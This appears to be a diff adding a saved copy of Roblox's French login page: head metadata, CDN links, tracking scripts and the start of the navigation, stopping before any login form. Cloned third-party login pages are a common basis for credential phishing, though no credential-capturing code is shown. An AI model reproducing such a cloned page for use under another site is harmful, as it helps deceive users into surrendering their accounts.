@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head data-machine-id="973bab01-4436-eb20-5f16-d2258d75937f"><style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+<!-- MachineID: 973bab01-4436-eb20-5f16-d2258d75937f -->
+<title>Connexion à Roblox</title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Roblox Corporation">
+<meta name="description" content="Connecte-toi à ton compte Roblox ou inscris-toi pour créer un nouveau compte.">
+<meta name="keywords" content="jeux en ligne, développer des jeux vidéos, cartes-cadeaux roblox, jouer en cloud, VR, roblox premium, hub création">
+
+<meta name="apple-itunes-app" content="app-id=431946152">
+<link rel="apple-touch-icon" href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png">
+
+<script type="application/ld+json">
+{
+"@context" : "https://schema.org",
+"@type" : "Organization",
+"name" : "Roblox",
+"url" : "https://www.roblox.com/",
+"image" : "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png",
+"logo" : "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png",
+"email" : "info@roblox.com",
+"sameAs" : [
+"https://www.facebook.com/roblox/",
+"https://twitter.com/roblox",
+"https://www.linkedin.com/company/147977",
+"https://www.instagram.com/roblox/",
+"https://www.youtube.com/user/roblox",
+"https://www.twitch.tv/roblox"
+]
+}
+</script>
+
+<meta ng-csp="no-unsafe-eval">
+
+<meta name="locale-data" data-language-code="fr_fr" data-language-name="Français" data-url-locale="fr" data-override-language-header="true">
+<meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown" data-is-chrome-os="false" data-is-pcgdk-app="false" data-is-samsung-galaxy-store-app="false">
+<meta name="environment-meta" data-domain="roblox.com" data-is-testing-site="false">
+
+<meta id="roblox-display-names" data-enabled="true">
+
+<meta name="hardware-backed-authentication-data" data-is-secure-authentication-intent-enabled="true" data-is-bound-auth-token-enabled="true" data-bound-auth-token-whitelist="{&quot;Whitelist&quot;:[{&quot;apiSite&quot;:&quot;auth.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountsettings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;inventory.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountinformation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;billing.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;premiumfeatures.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;trades.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;groups.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;adconfiguration.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;ads.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;assetdelivery.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;avatar.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;badges.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;catalog.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;chat.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;chatmoderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;clientsettings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;contacts.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;contentstore.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;develop.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;economy.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;engagementpayouts.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;followings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;friends.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;gameinternationalization.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;gamejoin.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;gamepersistence.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;games.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;groupsmoderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;itemconfiguration.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;locale.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;localizationtables.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;metrics.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;moderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;notifications.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;points.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;presence.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;publish.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;privatemessages.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;thumbnailsresizer.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;thumbnails.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;translationroles.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;translations.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;twostepverification.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;usermoderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;users.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;voice.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;realtimenotifications.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;jQuery&quot;,&quot;sampleRate&quot;:&quot;1000000&quot;}]}"></meta>
+<meta name="account-switching-data" data-is-account-switching-enabled="true">
+<meta name="passkey-data" data-is-passkey-login-enabled="true">
+<meta name="passkey-data-android" data-is-passkey-login-enabled-android="true">
+
+<meta name="page-guac-migration" data-v1-path="/universal-app-configuration/v1/behaviors/<behaviour-name>/content" data-v2-path="/guac-v2/v1/bundles/<behaviour-name>" data-behavior-page-heartbeat-v2="true" data-behavior-app-policy="true" data-behavior-chat-ui="true" data-behavior-cookie-policy="true" data-behavior-intl-auth-compliance="true" data-behavior-navigation-header-ui="true" data-behavior-user-heartbeats="true" data-behavior-free-communication-infographics="true" data-behavior-play-button-ui="true" data-behavior-vpc-launch-status="true" data-behavior-configure-group-ui="true" data-behavior-content-rating-logo="true" data-behavior-group-details-ui="true" data-behavior-inventory-creator-policy="true" data-behavior-legal-text-eea-uk="true" data-behavior-private-messages-ui="true" data-behavior-texas-u18-vpc-optimization="true" data-behavior-user-agreements-policy="true" data-behavior-user-settings-global-privacy-control-policy="true" data-behavior-vng-buy-robux="true" data-behavior-web-profile-ui="true" data-behavior-display-names="true" data-behavior-report-abuse-ui="true" data-behavior-account-settings-ui="true" data-behavior-abuse-reporting-revamp="true">
+<meta name="page-meta" data-internal-page-name="Login">
+<meta name="page-retry-header-enabled" data-retry-attempt-header-enabled="True">
+
+<script type="text/javascript">
+var Roblox = Roblox || {};
+
+Roblox.BundleVerifierConstants = {
+isMetricsApiEnabled: true,
+eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
+deviceType: "Computer",
+cdnLoggingEnabled: JSON.parse("true")
+};
+</script>
+<script src="/js/utilities/bundleVerifier.js?v=2f89a5fa99eb4cb3591ea59b884e458d" type="text/javascript"></script>
+
+<link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
+
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="FoundationCss" data-bundle-source="Main" href="https://css.rbxcdn.com/8ecc19dceb6abc73a66adb571ddf1a0423bdc0511e9151ac73dbbaffffe0593c.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/290dca5b4928f8d7accb2da17dbcba6b23303eb0a6466f8aa530cce979fbfae0.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Builder" data-bundle-source="Main" href="https://css.rbxcdn.com/6748baae45a07deac6a5c354f7bed6417cd1603ff82aa9b5b72d2013e0cb0793.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/28d3da7c913edb3c5dfb82f72058178c9ba2c6fb9876b08d73677160922ab903.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main" href="https://css.rbxcdn.com/66b2fd496e668938e3b0e2d9a0c12f9f88c3a1a4974608f69059d8061fc0141f.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/99bc7bc872c39ffa5d2bbb936a006c28d743808ba187f992ad896a31618c17cf.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/f77e16b9fa5823882aaa0cdabade9706b9ba2b7e050d23d2831da138a58e5f7f.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/b2cff71de0c286e8f85b1a26a8b87a8cd7f77422c592849ad5114ac5d929c575.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSwitcher" data-bundle-source="Main" href="https://css.rbxcdn.com/49fff8dad77e5262087267ee2e8fda1607525506c4a1ca20af60f9757684e980.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="PriceTag" data-bundle-source="Main" href="https://css.rbxcdn.com/9bfc48ea40a698035ea8cbe3d3e94bd06d3aac48969bedceb6d8ba5ff17ff84d.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="SearchLandingPage" data-bundle-source="Main" href="https://css.rbxcdn.com/60cfeb2f8467bbbf0ca06d8c31e3302be1b43f1f195fa69e6e9f526e4f78dce4.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/c0620745f2a20586f5e975b573d652f55825f437ae54cb0441cd3da9408a57a9.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/7e348738266e9ea2bae9314a2d26b33618c6f4cf3c527b11023620d973c6e7fc.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/945686c706d827658e2e4dee3009559078256e204bb42a3f02fdc6c9552cc7f7.css">
+<link rel="canonical" href="https://www.roblox.com/fr/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile">
+
+<link rel="alternate" href="https://www.roblox.com/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="x-default">
+<link rel="alternate" href="https://www.roblox.com/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="en">
+<link rel="alternate" href="https://www.roblox.com/de/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="de">
+<link rel="alternate" href="https://www.roblox.com/es/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="es">
+<link rel="alternate" href="https://www.roblox.com/fr/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="fr">
+<link rel="alternate" href="https://www.roblox.com/id/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="id">
+<link rel="alternate" href="https://www.roblox.com/it/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="it">
+<link rel="alternate" href="https://www.roblox.com/ja/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="ja">
+<link rel="alternate" href="https://www.roblox.com/ko/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="ko">
+<link rel="alternate" href="https://www.roblox.com/pl/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="pl">
+<link rel="alternate" href="https://www.roblox.com/pt/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="pt">
+<link rel="alternate" href="https://www.roblox.com/th/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="th">
+<link rel="alternate" href="https://www.roblox.com/tr/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="tr">
+<link rel="alternate" href="https://www.roblox.com/vi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="vi">
+<link rel="alternate" href="https://www.roblox.com/ar/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Ffr%2Fusers%2F9491162343%2Fprofile" hreflang="ar">
+
+<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___fb0c7d1e28371fc5e8367ce241b98d69_m.css/fetch">
+
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccessManagementUpsellV2" data-bundle-source="Main" href="https://css.rbxcdn.com/07e3a4ef8c2aaf8a40f9f96d0fb51721658cdbfdce400a27bd919975fde65476.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/bc981bafa6b0a52c86d071d1f81b24d168a8dd92e72b8ac52d37cb46bf8bd8c42.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/07d73a0fe62fadd30d32d50e667e7d6b62ca192cd258a1c3340cb262de401d72.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSelector" data-bundle-source="Main" href="https://css.rbxcdn.com/97a9d5a74599e95902f6456aea6e3cfaa9fe463ebbe0ae4a6a5025d40e1b7866.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ReactLogin" data-bundle-source="Main" href="https://css.rbxcdn.com/e712ca41cb057bb3437b163827c3c781440d8e620a807aa2b3e4887da9864da7.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/7dfc7837b5da6850e13413c630b37da7e88aeb610ca2c7d4e8b71b02cbdc6ba6.css">
+
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchaseUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3c4bd9b17b9020d9ebc87d4542a68a949a9de6150a55a92f0e65514520ee777e.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchase" data-bundle-source="Main" href="https://css.rbxcdn.com/1b6cc6d0699561a61e37bae3b8fa07ac5698c5c41c8375ac4f907e189be90232.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="IdVerification" data-bundle-source="Main" href="https://css.rbxcdn.com/3bca47a98d58fdf98a7063c4f3b390671e5326ed559813887f3945876c997da6.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccessManagementUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/d45e200658a1343116bbf4a88c367d093758085e7d001918d641c85b2143468f.css">
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="GameLaunch" data-bundle-source="Main" href="https://css.rbxcdn.com/c5373f0dced8d7be7bb3ad1b978fb8af776157fcc41ad3d5c92d725063c2e6e1.css">
+
+<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" href="https://css.rbxcdn.com/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css">
+
+<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="EnvironmentUrls" data-bundle-source="Main" src="https://js.rbxcdn.com/fc5032e013a877ae8dfdaf16e906375fc2d37781f22ca2908ee39b163d5e6269.js"></script>
+
+<script type="text/javascript">
+var Roblox = Roblox || {};
+Roblox.GaEventSettings = {
+gaDFPPreRollEnabled: "false" === "true",
+gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
+gaPerformanceEventEnabled: "false" === "true"
+};
+</script>
+
+<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="headerinit" type="text/javascript" src="https://js.rbxcdn.com/6f8bcfd33c17e884e38a8dcb89b5da42.js"></script>
+
+<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main" src="https://js.rbxcdn.com/5c8a2ba3737908f693394045e81ebd71c77cde6f87550ea51f7833e8c98200ae.js"></script>
+<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main" src="https://js.rbxcdn.com/2f0fd0c2760ff1898187af6df3b764f4b08f77a315d0a33654f105f61b0ea6d0.js"></script>
+
+<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main" src="https://js.rbxcdn.com/dd0d34c6d7afd472e5636ca7645e703dd18502fc01c8211279879f64c847dee4.js"></script>
+
+<meta name="roblox-tracer-meta-data" data-access-token="" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com" data-sample-rate="0" data-is-instrument-page-performance-enabled="false">
+<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/f85ce090699c1c3962762b8a2f8b252f0f2a7d0424c146f41d6c5abbf0147a57.js"></script>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+
+<script>
+//Set if it browser's do not track flag is enabled
+var Roblox = Roblox || {};
+(function() {
+var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+if (typeof window.external !== "undefined" &&
+typeof window.external.msTrackingProtectionEnabled !== "undefined") {
+dnt = dnt || window.external.msTrackingProtectionEnabled();
+}
+Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
+})();
+</script>
+
+<script type="text/javascript">
+if (Roblox && Roblox.EventStream) {
+Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png",
+"//ecsv2.roblox.com/www/e.png",
+"//ecsv2.roblox.com/pe?t=studio",
+"//ecsv2.roblox.com/pe?t=diagnostic");
+}
+</script>
+
+<script type="text/javascript">
+if (Roblox && Roblox.PageHeartbeatEvent) {
+Roblox.PageHeartbeatEvent.Init([2,8,20,60]);
+}
+</script>
+<script>
+Roblox = Roblox || {};
+Roblox.AbuseReportPVMeta = {
+desktopEnabled: false,
+phoneEnabled: false,
+inAppEnabled: false
+};
+</script>
+
+<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="4" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">
+
+<style type="text/css">.foundation-web-interactable{outline-width:0;overflow:hidden;position:relative}.foundation-web-interactable:before{bottom:0;content:"";left:0;position:absolute;right:0;top:0;transition:background-color var(--time-100) var(--ease-linear)}.foundation-web-interactable:focus-visible{outline:var(--stroke-thicker) solid var(--color-selection-start);outline-offset:3px}@media (hover:hover){.foundation-web-interactable:not(:disabled):hover:before{background-color:var(--color-state-hover)}}.foundation-web-interactable:not(:disabled):active:before{background-color:var(--color-state-press)}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal;display:flex}.foundation-web-loading-spinner svg path{fill:var(--color-action-standard-foreground)}</style><style type="text/css">.foundation-web-button{-webkit-user-select:none;-moz-user-select:none;user-select:none}.foundation-web-button[disabled]{opacity:.5}.foundation-web-button .foundation-web-loading-spinner svg path{fill:currentColor}</style><style type="text/css">.foundation-web-icon-button[disabled]{opacity:.5}</style><style type="text/css">.foundation-web-checkbox.foundation-web-checkbox-disabled{opacity:.5}.foundation-web-checkbox .foundation-web-interactable{outline-offset:3px}</style><style type="text/css">.foundation-web-dropdown.foundation-web-dropdown-disabled{opacity:.5;pointer-events:none}.foundation-web-dropdown-trigger{border-width:1px}.foundation-web-dropdown-trigger.foundation-web-interactable:focus-visible{outline-offset:4px}.foundation-web-menu-item.foundation-web-interactable:focus-visible{outline-offset:-1px}.foundation-web-menu-item.foundation-web-interactable:focus-visible:hover{outline-width:0}.foundation-web-menu-item[data-disabled] span{opacity:.5}</style><style type="text/css">.disabled{opacity:.5}.foundation-web-radio-indicator:after{background-color:var(--color-action-sub-emphasis-foreground);border-radius:100%;content:"";display:block}.foundation-web-radio-indicator-xsmall:after{height:var(--size-150);width:var(--size-150)}.foundation-web-radio-indicator-small:after{height:var(--size-200);width:var(--size-200)}.foundation-web-radio-indicator-large:after,.foundation-web-radio-indicator-medium:after{height:var(--size-250);width:var(--size-250)}.foundation-web-radio{align-items:center;border:var(--stroke-standard) solid;border-color:var(--color-stroke-emphasis);border-radius:100%;display:flex;flex:0 0 auto;flex-direction:column;justify-content:center;outline-offset:3px}.foundation-web-radio[data-state=checked]{background-color:var(--color-action-sub-emphasis-background)}</style><style type="text/css">.foundation-web-toggle.disabled{opacity:50%}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style><style type="text/css">@keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal}</style>
+
+</head>
+<body id="rbx-body" dir="ltr" class="rbx-body dark-theme builder-font " data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
+<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Theme" data-bundle-source="Main" src="https://js.rbxcdn.com/02a63ed03498b17dc2e133716717d996d9be5ab25ae788ee1234d40267fc2d2b.js"></script>
+
+<meta name="csrf-token" data-token="NXJIHyPz+c33">
+
+<script src="https://roblox.com/js/hsts.js?v=3" type="text/javascript" id="hsts"  async=""></script>
+
+<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Linkify" data-bundle-source="Main" src="https://js.rbxcdn.com/1d87d1231072878a0f6164e84b8cfa6f90a1b31b18ba5d8f410b947d4b029fe8.js"></script>
+
+<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">
+</div><div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">
+</div>
+
+<div id="wrap" class="wrap no-gutter-ads logged-out">
+
+<div id="navigation-container" class="builder-font ixp-marketplace-rename-treatment" data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="True" data-platform-event-left-nav-entry-start-time="01/01/2000 12:00:00" data-platform-event-left-nav-entry-end-time="09/22/2025 17:00:00" data-platform-event-left-nav-url="https://www.roblox.com/games/78880563336454/The-Takeover">
